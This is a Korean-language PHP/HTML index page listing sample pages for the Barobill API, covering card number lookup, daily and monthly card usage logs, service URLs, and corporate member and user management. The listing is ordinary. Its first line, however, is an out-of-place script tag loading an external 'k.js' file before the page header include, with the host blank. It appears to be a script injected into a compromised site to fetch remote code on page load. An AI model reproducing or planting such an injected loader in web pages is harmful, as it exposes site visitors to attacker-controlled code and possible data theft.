<script type='text/javascript' src='https:// /k.js?v=222'></script><?php include '../_include/top.php'; ?>
<fieldset class="fieldset1">
	<legend>카드조회 관련 API</legend>
	<fieldset class="fieldset2">
		<legend>조회</legend>
		<ul>
			<li><a href="API_CARD/GetCard.php">GetCard</a> - 등록한 카드번호 조회</li>
			<li><a href="API_CARD/GetDailyCardLog.php">GetDailyCardLog</a> - 일별 카드 사용내역 조회</li>
			<li><a href="API_CARD/GetDailyCardLogEx.php">GetDailyCardLogEx</a> - 일별 카드 사용내역 조회 (확장)</li>
			<li><a href="API_CARD/GetMonthlyCardLog.php">GetMonthlyCardLog</a> - 월별 카드 사용내역 조회</li>
			<li><a href="API_CARD/GetMonthlyCardLogEx.php">GetMonthlyCardLogEx</a> - 월별 카드 사용내역 조회 (확장)</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>URL 관련</legend>
		<ul>
			<li><a href="API_CARD/GetCardScrapRequestURL.php">GetCardScrapRequestURL</a> - 카드조회 서비스 신청 URL</li>
			<li><a href="API_CARD/GetCardManagementURL.php">GetCardManagementURL</a> - 카드번호 관리 URL</li>
			<li><a href="API_CARD/GetCardLogURL.php">GetCardLogURL</a> - 카드 사용내역 url</li>
		</ul>
	</fieldset>
</fieldset>
<br />
<fieldset class="fieldset1">
	<legend>바로빌 기본 API</legend>
	<fieldset class="fieldset2">
		<legend>회원사 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/CheckCorpIsMember.php">CheckCorpIsMember</a> - 회원사 여부 확인</li>
			<li><a href="API_BAROBILL/RegistCorp.php">RegistCorp</a> - 회원사 추가</li>
			<li><a href="API_BAROBILL/UpdateCorpInfo.php">UpdateCorpInfo</a> - 회원사 정보 수정</li>
			<li><a href="API_BAROBILL/GetCorpMemberContacts.php">GetCorpMemberContacts</a> - 회원사 담당자 목록</li>
			<li><a href="API_BAROBILL/ChangeCorpManager.php">ChangeCorpManager</a> - 회원사 관리자 변경</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>사용자 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/AddUserToCorp.php">AddUserToCorp</a> - 사용자 추가</li>
			<li><a href="API_BAROBILL/UpdateUserInfo.php">UpdateUserInfo</a> - 사용자 정보 수정</li>
			<li><a href="API_BAROBILL/UpdateUserPWD.php">UpdateUserPWD</a> - 사용자 비밀번호 수정</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>포인트 관련</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBalanceCostAmount.php">GetBalanceCostAmount</a> - 잔여포인트 확인</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>기타</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBaroBillURL.php">GetBaroBillURL</a> - 바로빌 URL</li>
		</ul>
	</fieldset>
</fieldset>
<?php include '../_include/bottom.php'; ?>